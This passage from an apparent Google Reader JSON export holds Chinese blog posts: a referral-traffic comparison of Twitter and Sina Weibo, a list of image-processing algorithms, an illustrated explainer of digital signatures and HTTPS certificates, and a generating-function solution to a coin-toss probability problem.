附：数据分析</h3>\n\n<p>我从2003年开始写blog，目前手里有的访问记录是从05年记录的。中间我写过3篇文章引起了比较大的反应，在我blog上都创造了数万的访问量。利用这些数据，我设计一个简要粗糙的统计模型，用来衡量twitter和新浪微博传播能力的差距。twitter特殊在于常年被封，又有大量不同第三方工具，所以用户来源非常多样，并不是都来自twitter.com，要统计非常难。这也就是这个统计模型存在的意义。因为数据获取困难，所以这个统计模型有大量估算和抽样，未必准确。也欢迎提供数据或者挑毛病。这是一个有趣的话题，也值得研究。</p>\n\n<p>数据来源:我的blog，twitter</p>\n\n<p>数据收集:<br>\n<b><a href=\"http://blog.devep.net/virushuo/2010/01/14/blog56google_blogtinyfool_1_go.html\">A Google百度和谷歌的那些事</a> </b> 发于 2010-01-14<br>\n2010.1.14-2010.1.17 3天 59,355 Visits 83,586 Pageviews <br>\n1.      (direct) / (none) 21,278        35.85%<br>\n2.      t.sina.com.cn / referral 7,349  12.71%<br>\n3.      9.douban.com / referral 6,234   10.78%<br>\n4.      douban.com / referral 2,604   4.50%<br>\n5.      twitter.com / referral 1,888    3.26%</p>\n\n<p><b><a href=\"http://blog.devep.net/virushuo/2011/03/26/post_78.html\">B 写给和百度作战的文艺工作者们</a></b>  发于2011-03-26<br>\n2011.3.25-2011.3.28 56,365 Visits 82,489 Pageviews </p>\n\n<p>1. \tt.sina.com.cn / referral 19,170 \t34.67%<br>\n2. \t(direct) / (none) 16,885 \t30.54%<br>\n3. \tdouban.com / referral 3,286 \t5.94%<br>\n8. \ttwitter.com / referral 792 \t1.43%<br>\n10. \t9.douban.com / referral 723 \t1.31%</p>\n\n<p><b><a href=\"http://blog.devep.net/virushuo/2011/06/09/post_81.html\">C 新浪微博你让我浑身发冷 </a></b> 发于2011-06-09<br>\n2011.6.9-2011.6.11 30,511 Visits 39,779 Pageviews <br>\n1.      (direct) / (none) 11,993        39.31%<br>\n2.      weibo.com / referral 4,444      14.57%<br>\n3.      douban.com / referral 1,746     5.72%<br>\n4.      t.qq.com / referral 1,576       5.17%<br>\n5.      fanfou.com / referral 1,547     5.07%<br>\n6.      twitter.com / referral 1,073    3.52%<br>\n10.     9.douban.com / referral 490     1.61%</p>\n\n<p>以上数据均为发表文章当天开始，3天数据，只选重要数据，不包括和本次讨论无关数据（比如搜索引擎来源）。<br>\n这三篇文章特点鲜明，除了都在互联网上引起较大流行之外，其和新浪关系正好为：A 中立，B 有利（被盗版的作者们都聚集在新浪微博，是维权主阵地），C 有害（直接指责新浪和微博）<br>\nB篇因为被大量名人转发，所以可以理解为享受等同名人待遇。其他2篇为草根待遇。</p>\n\n<p>直接计算新浪微博和twitter带来的流量比分别为:<br>\n<b>A  3.89 倍</b><br>\n<b>B  24.2 倍</b><br>\n<b>C  4.14 倍</b></p>\n\n<p>twitter因为被封，现在剩余中文用户不过5~10万，新浪微博声势正旺，在Q1财报中提到的用户量是1.4亿。twitter取高值10万用户，计算 140000000/100000=1400倍。而事实上就算享受了名人待遇的B，也只有24.2倍。按照这个数字计算，新浪微博以高于twitter用户量1400倍的巨大数字，只多带来了24.2倍访问量，如此计算，新浪微博信息传播能力实际只有twitter的1/57.3，小的吓人。如果用文章A/C的非名人待遇计算，则只有1/359或1/338。非常符合前文分析，新浪微博因为滥用富媒体和评论，导致人们处理信息难度更大，传播能力大大下降。换言之，新浪微博只是稍微丰富一点的单向媒体，顶多算web 1.5，距离twitter真正的web 2.0时代相差很远。</p>\n\n<p>刚才说了，twitter因为常年被封，所以能看出来源为twitter的只是从twitter.com来的流量，只占中文twitter用户中极少部分。不过就只对比这极少部分，结果仍然令人惊讶。为了让数字更加真实，我试图寻找一个统计模型，给twitter计算一个系数，让twitter数字更加真实。这里应该注意到3篇文章的direct访问量很大，事实上作为个人blog，直接访问量应该很小，大部分用户来自订阅搜索和SNS，换言之，用户很少有把我blog放入收藏夹定期访问的习惯。因此我判断目前direct访问中有相当比例是来自无法追踪来源的twitter用户。</p>\n\n<p><br>\n于是我又统计了在这3篇文章发表之后1个月内的direct访问量，作为平时数据用于比较，分别是：</p>\n\n<p>2010.2.1-2010.2.28 28天 对应文章A<br>\n1.  (direct) / (none) 2,939   31.49% 104/天</p>\n\n<p>2011.4.1-2011.4.30 30天 对应文章B<br>\n1.  (direct) / (none) 5,692   29.92% 189/天</p>\n\n<p>2010.5.1-2010.5.30 30天 对应文章C<br>\n1.  (direct) / (none) 6,044   38.78% 201/天</p>\n\n<p>用A/B/C三篇文章数据对应这些数据计算，(发文3天直接访问量/3-发文后一个月平均每天访问量)/(发文3天twitter带来流量/3) 这个计算方法是试图找出我blog正常直接访问量和有可能的无法追踪的twitter访问量关系，计算结果为:</p>\n\n<p><b>A (21278/3-201)/(1888/3)=10.9倍</b></p>\n\n<p><b>B (16885/3-189)/(792/3)=20.60倍</b></p>\n\n<p><b>C (11993/3-201)/(1073/3)=10.61倍</b></p>\n\n<p>平均14倍，也就是说，应该把能记录的twitter访问量*14，是更加真实的twitter访问量。其中B的20倍相差过大，干脆忽略不算。那么也有10倍差距。</p>\n\n<p>为了交叉验证，我又选取了另外一组数据，这组数据是通过twitter中观察使用twitter的web页面发推人数获得的，如下:</p>\n\n<p>我的timeline 2/10<br>\n我的timeline 1/10<br>\n搜索\"@hecaitou\" 0/10<br>\n搜索\"我\" 3/10<br>\n搜索\"吃饭\" 0/10<br>\n搜索\"赞\" 2/10</p>\n\n<p>按照这个抽样计算，使用twitter web用户只占全部用户13%。也就是说不可追踪用户有7.5倍左右。和之前计算出的10倍比较接近。</p>\n\n<p>如果把A/B/C三篇文章中twitter带来流量都*10，会发现结果和新浪微博已经非常接近。也就是说，新浪以1.4亿用户之巨，和twitter的10万用户传播能力差不多。</p>\n\n<p>仔细观察这些数据还会发现有趣的事，我发现：<br>\n<ul><br>\n<li> 豆瓣传播能力惊人，已经和新浪差距不大</li><br>\n<li> 饭否重开之后逐渐追了上来</li><br>\n<li> 腾讯微博用户量也在快速上升</li><br>\n</ul></p>\n\n<p>综合这些数字，我认为可以支持我前文所提出的结论，新浪因为过度使用富媒体，用评论破坏了信息架构，导致人们信息处理能力大大下降，试图利用新浪微博做营销的人占相当比例，充数的僵尸占相当比例，综合这些因素，导致新浪微博只是看起来热闹。实际上传播能力并不强。饭否是twitter精神在国内的传递者，虽然关站一年，错过了微博产品的快速发展时期，但其和twitter一致的信息架构和第三方，也形成了类似的社区气氛，在C文章数据中，已经可以看到饭否和新浪微博差距只有3倍，相信会有机会追上来。</p>\n\n<p>根据这些数字，号称在新浪微博对工作有用，有营销效果，很可能只是自欺欺人。同样的时间如果花在其他平台，效果也差距不会大。这个结论对名人可能有所不同，但对普通人我认为是准确的。所以如果你不是名人，到现在在新浪微博仍然没有几万粉丝，那么这种营销对你毫无意义，你的存在是帮别人营销的，并不是营销自己。</p>\n\n<p>所以综合以上，最终我的结论是：</p>\n\n<p>1 国内微博产品设计导致了信息流动速度不够快（这说不上好或者不好，或者这就是他们追求的）。<br>\n2 twitter和饭否是高速信息流动系统。<br>\n3 豆瓣，腾讯微博，饭否，都不可小看。<br>\n4 twitter和饭否一对杯具，一个被封多年，一个被关站一年，都错过了最佳发展时期，但其产品设计仍然保证了用户忠实，社区氛围好，传播能力极强。<br>\n5 微博营销是自欺欺人，这才是庞氏骗局。所谓有效的要么是偶然，要么是特殊名人的特殊时期，要么是不会算数，不会衡量效果。在新浪微博，除了李开复和姚晨那种一线名人，其他名人其实也很可怜，一样没什么人关注。<br>\n6 国内微博不是SNS，只是有一点社会化味道的媒体，最多只能算web 1.5<br>\n7 这场战争刚开始，距离结束还远着呢。<br>\n8 大多数人眼光短浅，认为\"产品\"好坏只是让他用起来是否舒服。其实让你不舒服的产品可能会有更好的效果，只是你不能理解罢了。<br>\n9 推荐阅读: <a href=\"http://dongxi.net/b06LJ\">为什么我永远不会雇佣一个\"社交媒体专家\" </a><br>\n10 twitter是microblogging这个概念的创始者，也贯彻最为彻底。饭否是twitter精神在中国的继承者。新浪微博做成了140个字的BBS。腾讯是QZone和IM的延伸，网易完全没弄明白自己在干嘛，搜狐不小心做成了tumblr，还不如直接改名叫轻博算了。</p>\n\n<p><br>\n注：我写这个blog时，和菜头 @hecaitou 也在twitter发表一些看法，我们很多地方看法类似。这篇blog是我个人独立研究完成，与和菜头的结论，是同时彼此独立研究的结果。不过我也盼望他能写一篇blog，做为经历了两个微博产品的人，他应该有更多有价值看法和数据。</p>\n\n<p><br>\nupdate 1: 后来想起来，如果所谓\"让用户舒服就是好的\"，那么当用户140个字写不下的时候，用户也是不舒服的，为什么不干脆放宽字数限制，让用户随便写？别笑，用户真的有这需求，还有个叫长微博 http://weibobobo.com/k/ 的东西，用来把正篇文章抓成图片贴到微博上。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313328948397",
    "timestampUsec" : "1313328948397034",
    "id" : "tag:google.com,2005:reader/item/a4f9987444c230fb",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "神奇的图像处理算法",
    "published" : 1313222149,
    "updated" : 1313222149,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/08/amazing_algorithms_of_image_processing.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>几周前，我介绍了<a href=\"http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html\">相似图片搜索</a>。</p><p>这是利用数学算法，进行高难度图像处理的一个例子。事实上，图像处理的数学算法，已经发展到令人叹为观止的地步。</p>\n\n<p><a href=\"http://www.scriptol.com/programming/graphic-algorithms.php\">Scriptol</a>列出了几种神奇的图像处理算法，让我们一起来看一下。</p>\n\n<p><strong>一、像素图生成向量图的算法</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081301.png\"><img src=\"http://image.beekka.com/blog/201108/bg2011081302.png\"></p>\n\n<p>数字时代早期的图片，分辨率很低。尤其是一些电子游戏的图片，放大后就是一个个像素方块。<a href=\"http://research.microsoft.com/en-us/um/people/kopf/pixelart/\">Depixelizing</a>算法可以让低分辨率的像素图转化为高质量的向量图。</p>\n\n<p><strong>二、黑白图片的着色算法</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081303.jpg\"><img src=\"http://image.beekka.com/blog/201108/bg2011081304.jpg\"></p>\n\n<p>让老照片自动变成彩色的<a href=\"http://www.cs.huji.ac.il/~yweiss/Colorization/index.html\">算法</a>。</p>\n\n<p><strong>三、消除阴影的算法</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081305.jpg\"></p>\n\n<p>不留痕迹地去掉照片上某件东西的阴影的<a href=\"http://www.cs.huji.ac.il/~danix/ShadowRemoval/index.html\">算法</a>。</p>\n\n<p><strong>四、HDR照片的算法</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081307.jpg\"><img src=\"http://image.beekka.com/blog/201108/bg2011081308.jpg\"></p>\n\n<p>所谓\"HDR照片\"，就是扩大亮部与暗部的对比效果，亮的地方变得非常亮，暗的地方变得非常暗，亮暗部的细节都很明显。</p>\n\n<p>实现HDR的软件有很多，这里推荐<a href=\"http://gmic.sourceforge.net/\">G'MIC</a>。它是GIMP图像编辑软件的一个插件，代码全部开源。</p>\n\n<p><strong>五、消除杂物的算法</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081310.jpg\"></p>\n\n<p>所谓\"消除杂物\"，就是在照片上划出一块区域，然后用背景自动填补。<a href=\"http://www.logarithmic.net/pfh/resynthesizer\">Resynthesizer</a>可以做到这一点，它也是GIMP的一个插件。</p>\n\n<p><strong>六、自动合成照片的算法</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081311.jpg\"></p>\n\n<p>根据一张草图，选择原始照片，然后把它们合成在一起，生成新照片。这是清华大学的<a href=\"http://cg.cs.tsinghua.edu.cn/montage/main.htm\">科研成果</a>。</p>\n\n<p><strong>七、美容算法</strong></p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011081312.jpg\"></p>\n\n<p>自动对容貌进行\"美化\"的<a href=\"http://www.leyvand.com/research/beautification2008/\">算法</a>。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/08/amazing_algorithms_of_image_processing.html\">http://www.ruanyifeng.com/blog/2011/08/amazing_algorithms_of_image_processing.html</a></li>\n<li>最后修改时间：2011年8月25日 09:51</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011081500435188\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><a href=\"http://www.nanrenwa.com/click/go/ruanyifeng.banner.feed.yfblogfeed/gift\"><img src=\"http://nanrenwa.com/_img/a/2011/yfblog_feed.png\"></a></p>\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313253977387",
    "timestampUsec" : "1313253977387281",
    "id" : "tag:google.com,2005:reader/item/8d40742c632fdcec",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "数字签名是什么？",
    "published" : 1312892643,
    "updated" : 1312892643,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>今天，我读到一篇<a href=\"http://www.youdzone.com/signature.html\">好文章</a>。</p><p>它用图片通俗易懂地解释了，\"数字签名\"（digital signature）和\"数字证书\"（digital certificate）到底是什么。</p>\n\n<p>我对这些问题的理解，一直是模模糊糊的，很多细节搞不清楚。读完这篇文章后，发现思路一下子就理清了。为了加深记忆，我把文字和图片都翻译出来了。</p>\n\n<p>文中涉及的密码学基本知识，可以参见我以前的<a href=\"http://www.ruanyifeng.com/blog/2006/12/notes_on_cryptography.html\">笔记</a>。</p>\n\n<p>====================================================</p>\n\n<p><strong>数字签名是什么？</strong></p>\n\n<p>作者：David Youd</p>\n\n<p>翻译：阮一峰</p>\n\n<p>原文网址：<a href=\"http://www.youdzone.com/signature.html\">http://www.youdzone.com/signature.html</a></p>\n\n<p>1. </p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080901.png\"></p>\n\n<p>鲍勃有两把钥匙，一把是公钥，另一把是私钥。</p>\n\n<p>2.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080902.png\"></p>\n\n<p>鲍勃把公钥送给他的朋友们----帕蒂、道格、苏珊----每人一把。</p>\n\n<p>3.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080903.png\"></p>\n\n<p>苏珊要给鲍勃写一封保密的信。她写完后用鲍勃的公钥加密，就可以达到保密的效果。</p>\n\n<p>4.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080904.png\"></p>\n\n<p>鲍勃收信后，用私钥解密，就看到了信件内容。这里要强调的是，只要鲍勃的私钥不泄露，这封信就是安全的，即使落在别人手里，也无法解密。</p>\n\n<p>5.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080905.png\"></p>\n\n<p>鲍勃给苏珊回信，决定采用\"数字签名\"。他写完后先用Hash函数，生成信件的摘要（digest）。</p>\n\n<p>6.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080906.png\"></p>\n\n<p>然后，鲍勃使用私钥，对这个摘要加密，生成\"数字签名\"（signature）。</p>\n\n<p>7.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080907.png\"></p>\n\n<p>鲍勃将这个签名，附在信件下面，一起发给苏珊。</p>\n\n<p>8.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080908.png\"></p>\n\n<p>苏珊收信后，取下数字签名，用鲍勃的公钥解密，得到信件的摘要。由此证明，这封信确实是鲍勃发出的。</p>\n\n<p>9.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080909.png\"></p>\n\n<p>苏珊再对信件本身使用Hash函数，将得到的结果，与上一步得到的摘要进行对比。如果两者一致，就证明这封信未被修改过。</p>\n\n<p>10.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080910.png\"></p>\n\n<p>复杂的情况出现了。道格想欺骗苏珊，他偷偷使用了苏珊的电脑，用自己的公钥换走了鲍勃的公钥。此时，苏珊实际拥有的是道格的公钥，但是还以为这是鲍勃的公钥。因此，道格就可以冒充鲍勃，用自己的私钥做成\"数字签名\"，写信给苏珊，让苏珊用假的鲍勃公钥进行解密。</p>\n\n<p>11.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080911.png\"></p>\n\n<p>后来，苏珊感觉不对劲，发现自己无法确定公钥是否真的属于鲍勃。她想到了一个办法，要求鲍勃去找\"证书中心\"（certificate authority，简称CA），为公钥做认证。证书中心用自己的私钥，对鲍勃的公钥和一些相关信息一起加密，生成\"数字证书\"（Digital Certificate）。</p>\n\n<p>12.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080912.png\"></p>\n\n<p>鲍勃拿到数字证书以后，就可以放心了。以后再给苏珊写信，只要在签名的同时，再附上数字证书就行了。</p>\n\n<p>13.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080913.png\"></p>\n\n<p>苏珊收信后，用CA的公钥解开数字证书，就可以拿到鲍勃真实的公钥了，然后就能证明\"数字签名\"是否真的是鲍勃签的。</p>\n\n<p>14.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080914.jpg\"></p>\n\n<p>下面，我们看一个应用\"数字证书\"的实例：https协议。这个协议主要用于网页加密。</p>\n\n<p>15.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080915.png\"></p>\n\n<p>首先，客户端向服务器发出加密请求。</p>\n\n<p>16.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080916.png\"></p>\n\n<p>服务器用自己的私钥加密网页以后，连同本身的数字证书，一起发送给客户端。</p>\n\n<p>17.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080917.png\"></p>\n\n<p>客户端（浏览器）的\"证书管理器\"，有\"受信任的根证书颁发机构\"列表。客户端会根据这张列表，查看解开数字证书的公钥是否在列表之内。</p>\n\n<p>18.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080918.png\"></p>\n\n<p>如果数字证书记载的网址，与你正在浏览的网址不一致，就说明这张证书可能被冒用，浏览器会发出警告。</p>\n\n<p>19.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080919.jpg\"></p>\n\n<p>如果这张数字证书不是由受信任的机构颁发的，浏览器会发出另一种警告。</p>\n\n<p>20.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201108/bg2011080920.png\"></p>\n\n<p>如果数字证书是可靠的，客户端就可以使用证书中的服务器公钥，对信息进行加密，然后与服务器交换加密信息。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html\">http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html</a></li>\n<li>最后修改时间：2011年8月23日 00:35</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011081500435188\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><a href=\"http://www.nanrenwa.com/click/go/ruanyifeng.banner.feed.yfblogfeed/gift\"><img src=\"http://nanrenwa.com/_img/a/2011/yfblog_feed.png\"></a></p>\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313122657161",
    "timestampUsec" : "1313122657161573",
    "id" : "tag:google.com,2005:reader/item/b14706e2795872ec",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Brain Storm", "概率", "生成函数", "数列", "组合数学", "导数" ],
    "title" : "生成函数的妙用：平均抛掷多少次硬币才会出现连续两个正面？",
    "published" : 1313058307,
    "updated" : 1313058307,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/4534",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    在<a href=\"http://www.matrix67.com/blog/archives/3638\">一篇老日志</a>中，我提到了一个经典的概率问题：平均需要抛掷多少次硬币，才会首次出现连续两个正面？它的答案是 6 次。它的计算方法大致如下。</p>\n<p>    首先，让我们来考虑这样一个问题： k 枚硬币摆成一排，其中每一枚硬币都可正可反；如果里面没有相邻的正面，则一共有多少种可能的情况？这可以用递推的思想来解决。不妨用 f(k) 来表示摆放 k 枚硬币的方案数。我们可以把这些方案分成两类：最后一枚硬币是反面，或者最后一枚硬币是正面。如果是前一种情形，则我们只需要看前 k - 1 枚硬币有多少摆法就可以了；如果是后一种情形，那么倒数第二枚硬币必须是反面，因而这种情形下的方案数就取决于前 k - 2 枚硬币的摆放方案数。因此我们得到， f(k) = f(k - 1) + f(k - 2) 。由于摆放一枚硬币有两种方案，摆放两枚硬币有三种方案，因而事实上 f(k) 就等于 F<sub>k+2</sub> ，其中 F<sub>i</sub> 表示 Fibonacci 数列 1, 1, 2, 3, 5, 8, …的第 i 项。</p>\n<p>    而“抛掷第 k 次才出现连续两个正面”的意思就是，最后三枚硬币是反、正、正，并且前面 k - 3 枚硬币中正面都不相邻。因此，在所有 2<sup>k</sup> 种可能的硬币正反序列中，只有 F<sub>k-1</sub> 个是满足要求的。也就是说，我们有 F<sub>1</sub> / 4 的概率在第二次抛币就得到了连续两个正面，有 F<sub>2</sub> / 8 的概率在第三次得到连续两个正面，有 F<sub>3</sub> / 16 的概率在第四次得到连续两个正面⋯⋯因此，我们要求的期望值就等于：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081101.png\" alt=\"\"></p>\n<p><span></span><br>\n    这个无穷级数就等于 6：</p>\n<p>      <img src=\"http://www.matrix67.com/blogimage_2010/201009091.png\" alt=\"\"></p>\n<p>    不过，最后这一步来得也太假了，因为我们借助了强大的 Mathematica 。今天重新翻到这篇旧日志时，我就在想，究竟怎样求出这个无穷级数呢？这个数列的某些特征让我联想到了生成函数这一数学工具，用生成函数处理这样的数列非常合适。我在很早很早以前就写过<a href=\"http://www.matrix67.com/blog/archives/120\">介绍生成函数的文章</a>，但遗憾的是，我对生成函数运用的了解，仅仅局限于教材和网络上给出的各种经典例子，从没有亲自用到过生成函数。今天算是我第一次真正使用生成函数，深感生成函数之妙。如果你是第一次看到生成函数的应用，想必你会大吃一惊，这种诡异的方法竟然能把答案搞出来！整个过程用到了很多生成函数的经典处理手段，这让它足以打败教材上的各种经典例子，成为了我最爱的生成函数应用例题之一。</p>\n<p> <br>\n <br>\n    让我们先来说说什么是生成函数吧。生成函数就是对数列进行编码的一种方式。我们可以用一个含有无限多项的多项式（注：这个说法是不准确的，有无限多项的不能叫多项式） a<sub>1</sub> · x<sup>1</sup> + a<sub>2</sub> · x<sup>2</sup> + a<sub>3</sub> · x<sup>3</sup> + … 把整个数列的全部信息装进去，其中第 i 次项系数就表示数列的第 i 项。因此，Fibonacci 数列的生成函数就可以写成：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081102.png\" alt=\"\"></p>\n<p>    厉害就厉害在，我们可以把生成函数表示成一个更简单的形式。先来看看 g(x)·x 的结果：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081103.png\" alt=\"\"></p>\n<p>    再看看 g(x) + g(x)·x 的结果：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081104.png\" alt=\"\"></p>\n<p>    你会发现， Fibonacci 数列的递推性质，使得上面这行式子与 g(x) 本身非常相像。事实上，如果把 g(x) 的每一项都除以 x ，再减去最前面多出来的 1 ，就能得到上面的这行式子了。因此，我们有：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081105.png\" alt=\"\"></p>\n<p>    我们甚至可以就此解出 g(x) 来：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081106.png\" alt=\"\"></p>\n<p>    于是，整个无穷级数 g(x) 被我们化简为了一个关于 x 的代数式！注意，虽然这个等式只在 x 充分小（小到级数 g(x) 收敛）的时候才有意义，不过这并不妨碍我们用这个代数式来代表 Fibonacci 数列的生成函数。我们可以把 Fibonacci 数列看作是生成函数的一个“展开”：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081107.png\" alt=\"\"></p>\n<p>    也就是说，这么一个小小的代数式就容纳了 Fibonacci 数列的全部信息！</p>\n<p> <br>\n <br>\n    生成函数是如此地具有代表性，以至于在研究数列时，我们常常会给出它的生成函数。在数列百科全书 <a href=\"http://oeis.org/\">OEIS</a> 中，生成函数几乎是必不可少的一项。例如，在 <a href=\"http://oeis.org/A000045\">Fibonacci 数列</a> 的描述中，FORMULA 一栏的第一行就是 G.f.: x/(1-x-x^2) ，说的就是 Fibonacci 数列的生成函数（generating function）。</p>\n<p>    更绝的是，我们还可以直接对数列的生成函数进行变换，从而得到新的数列。比方说，在生成函数上再乘以一个 x ，我们就会让每一项的 x 的指数加 1 ，从而让整个数列右移一位，得到了一个新的数列 F<sub>i-1</sub>，即 0, 1, 1, 2, 3, 5, …</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081108.png\" alt=\"\"></p>\n<p>    现在，我们需要用各种代数运算手段，对等式左边的生成函数进行变换，让等式右边的展开式变成本文开头的那个数列。什么操作能够同时让数列第 1 项除以 2 ，第 2 项除以 4 ，第 3 项除以 8 ，以此类推，让所有的第 i 项都除以 2<sup>i</sup> 呢？我们可以把所有的 x 都用 x / 2 来替代：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081109.png\" alt=\"\"></p>\n<p>    化简一下：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081110.png\" alt=\"\"></p>\n<p>    这就是数列 F<sub>i-1</sub> / 2<sup>i</sup> 的生成函数了。接下来，我们想要让第 i 项系数乘以一个 i ，也就是想要让每一项的系数都乘以该项的次数，这该怎么办呢？最神奇的地方出现了——我们对生成函数进行求导：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081111.png\" alt=\"\"></p>\n<p>    也就是：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081112.png\" alt=\"\"></p>\n<p>    不过，求导的同时，x 的次数也移动了一位。我们在生成函数上再乘以 x ，把 x 的次数纠正回来：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081113.png\" alt=\"\"></p>\n<p>    这就是本文最初的那个数列的生成函数了。令 x = 1 ，便有：</p>\n<p>     <img src=\"http://www.matrix67.com/blogimage_2011/2011081114.png\" 